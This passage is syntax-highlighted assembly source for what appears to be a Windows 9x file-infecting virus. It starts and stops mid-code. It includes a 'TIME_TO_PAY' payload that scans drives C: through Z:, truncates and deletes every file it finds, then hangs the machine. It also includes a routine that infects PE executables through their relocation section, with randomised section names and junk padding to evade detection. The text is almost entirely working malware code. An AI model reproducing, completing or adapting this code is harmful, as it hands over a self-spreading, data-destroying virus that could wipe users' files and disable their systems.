        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">INF_PROCS</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc8">EAX</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],(</span><span class="sc5">OFF_DOSINST</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">0EBH</span><span class="sc0"> </span><span class="sc1">;DROPPER MODE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">F_CLOSE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SET_ATTRIB_MODIFY_DATETIME</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MAN_ATTRIBUTES</span><span class="sc0">
</span><span class="sc5">REST_ATTRIB</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TIME_TO_PAY</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">_LEAVEMUSTCOMPLETE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;_ENTERMUSTCOMPLETE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc5">FIND_DATA</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ESI=&amp;TMP_PATH</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">':C'</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">':X'</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">FIND_DRIVE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">FIND_FIRST</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">37H</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_IO</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">SOME_FOUND</span><span class="sc0">
</span><span class="sc5">FIND_SLASH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NEXT_DRIVE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_SLASH</span><span class="sc0">
</span><span class="sc5">FIND_NEXT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_IO</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">OK_FOUND</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_IO</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FIND_SLASH</span><span class="sc0">
</span><span class="sc5">SOME_FOUND</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">OK_FOUND</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc5">EDX.CFILENAME</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">STORE_NAME</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">STORE_NAME</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.DWFILEATTRIBUTES</span><span class="sc4">],</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NOT_DIR</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.CFILENAME</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FIND_NEXT</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FIND_FIRST</span><span class="sc0">
</span><span class="sc5">NEXT_DRIVE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">FIND_DRIVE</span><span class="sc0">
</span><span class="sc5">GO_HANG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">        </span><span class="sc1">;_LEAVEMUSTCOMPLETE</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;HANG_ON_EXIT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FATAL_ERROR_HANDLER</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_HANG</span><span class="sc0">
</span><span class="sc5">NOT_DIR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLR_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_CREATE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">DEL_FILE</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
</span><span class="sc5">DEL_FILE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DELETE_FILE</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FIND_NEXT</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: EBP=&amp;LENGTH OF MACRO STRING</span><span class="sc0">
</span><span class="sc5">CORR_LENGTH</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">INF_EXE_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_EXE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">    </span><span class="sc1">;PE SPECIAL MODE</span><span class="sc0">
        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOSH_SIGNATURE.ESI</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOSH_SIGNATURE.ESI</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOSH_LFARLC.ESI</span><span class="sc4">],</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">DOSH_LFANEW.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">DOS_HEADER</span><span class="sc0"> </span><span class="sc1">;PHEADER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">PE_HEADER</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OBJECT_TABLE</span><span class="sc4">*</span><span class="sc5">MAX_OBJS</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_SIGNATURE.ESI</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_CPUTYPE.ESI</span><span class="sc4">],</span><span class="sc2">162H</span><span class="sc0">  </span><span class="sc1">;INTEL?</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_NUMOFOBJECT.ESI</span><span class="sc4">],</span><span class="sc5">MAX_OBJS</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_FLAGS.ESI</span><span class="sc4">],</span><span class="sc5">PE_FLAG_DLL</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PE_FLAG_NOT_FIXUP</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_FLAGS.ESI</span><span class="sc4">],</span><span class="sc5">PE_FLAG_32BIT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">PE_FLAG_EXECUTABLE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_IMAGEBASE.ESI</span><span class="sc4">],</span><span class="sc2">400000H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_FLAGS.ESI</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;PE_FLAG_NOT_FIXUP</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">PE_HEADER</span><span class="sc4">-</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OBJECT_TABLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEH_FIXUP.SD_SIZE.ESI</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">PEH_FIXUP.SD_RVA.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">GOZ_INF_EXIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INF_EXE_EXIT</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">FIND_FIXUPOBJ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OBJECT_TABLE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_RVA.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_FIXUPOBJ</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">NOCHNG_SATT_PSBL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_CHNG_ATT</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OT_FLAGS.EDI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">OT_FLAG_DISCARDABLE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OT_FLAG_SHARED</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">OT_FLAGS.EDI</span><span class="sc4">],</span><span class="sc5">OT_FLAG_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OT_FLAG_IDATA</span><span class="sc0">
</span><span class="sc5">NO_CHNG_ATT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">CHNG_SNAME_PSBL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_CHNG_NAME</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_NAME</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">NO_CHNG_NAME</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">LEN_PEND_JUNK</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">OUR_LEN</span><span class="sc4">+</span><span class="sc5">LEN_LOADER</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">CURRENT_LEN</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">COUNT_RET</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_VIRTSIZE.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CORR_SIZE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALSIZE.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GET_VIRTSIZE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALSIZE.EDI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GET_VIRTSIZE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSHFD</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">OK_RELOC_SIZE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">OK_RELOC_SIZE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALOFF.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PHYS_BODY_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FILL_SEC_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_RVA.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">PEH_IMAGEBASE.ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OFF_FIXUP</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">POPFD</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">MID_EXIT_ONE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OT_PHYSICALSIZE.EDI</span><span class="sc4">],</span><span class="sc5">MIN_RELOC_SIZE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">MID_EXIT_ONE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GETSIZE_FILE</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALOFF.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">OT_PHYSICALSIZE.EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">MID_EXIT_CMC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CORR_SIZE_ECX</span><span class="sc0">
        </span><span class="sc6">CMPSD</span><span class="sc0">
        </span><span class="sc6">SCASD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CORR_SIZE_ECX</span><span class="sc0">
